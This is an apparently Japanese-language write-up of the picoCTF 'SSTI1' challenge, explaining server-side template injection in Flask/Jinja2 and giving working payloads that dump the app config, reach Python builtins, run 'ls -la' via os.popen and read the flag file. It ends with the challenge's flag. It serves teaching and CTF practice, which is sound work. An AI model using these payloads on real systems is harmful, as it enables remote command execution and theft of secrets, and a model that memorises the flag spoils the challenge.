# 問題

>Description<br>
>I made a cool website where you can announce whatever you want! Try it out!

説明<br>
何でも自由に告知できる素敵なウェブサイトを作りました！ぜひ試してみてください！

# 解法要約
タイトル、判別、ls、file開く、勝ち

# 解法
タイトルがSSTI1なのが一番のヒント<br>
SSTIについては最後に

まずは以下のどれが効くかを確かめる<br>
```Text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

今回は `{7*7}` を入力すると49が帰ったのでこいつ

ここから難しいので先に実行したものだけ記載<br>
各コマンドは最後に

```python
{{config}}

{{ self.__init__.__globals__.__builtins__ }}


{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('ls -la').read() }}

{{ self.__init__.__globals__.__builtins__['open']('flag').read() }}
```

これで解答が出てくる

### ※SSTI (サーバーサイドテンプレートインジェクション)とは

動的なサイトを書くとき、`html += "<h1>" + name + "<\h1>"`とか書きたくないでしょ？<br>
それを楽にしてくれるのがテンプレートエンジン<br>

Flask (Python) では Jinja2 が, Rails (Ruby) では ERB が... などなど<br>

因みにテンプレートエンジンをも要らないとしたものが nextjs<br>
簡単に言うと nextjs では react を使って、サーバーもブラウザも html の組み立てに協力しる

SSTI はそんなテンプレートエンジンを狙った XSS ってイメージ

### ※それぞれのコマンドの説明

Jinja2 は Python とはほぼ同じで少し違う文法をしていて、 Flask を動かす OSユーザーと同じ権限で動く<br>
Flask において . (ピリオド) は<br>

1. 属性として探す (getattr(obj, 'name'))
2. 辞書のキーとして探す (obj['name'])
3. リストなどのインデックスとして探す

として働く<br>


```python
{{config}}
```
Flask が用意してくれた、デバッグ用コマンド<br>
シークレットキーやらアプリ名やらの設定情報が詰まってる<br>
見ておいて損ない

```python
{{ self.__init__.__globals__.__builtins__ }}
```
コマンドの意味は `self` 自身のオブジェクトの `__init__` 初期関数の、<br>
`__globals__` グローバルの変数・関数・モジュールのリストの `__builtins__` グローバル関数の要素を出力する

```python
{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('ls -la').read() }}
```
上で説明した `__builtins__` グローバル関数の要素の、<br>
`['__import__']` import関数で `('os')` osを引数にして、<br>
`popen('ls -la')` ls -la をシステムで動かしたときの出力を `read()` この場に出力する

```python
{{ self.__init__.__globals__.__builtins__['open']('flag').read() }}
```
`__builtins__` グローバル関数の要素の、<br>
`['open']` open関数で `('flag')` flagファイルを開いて、<br>
`read()` この場に出力する

# 解答
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}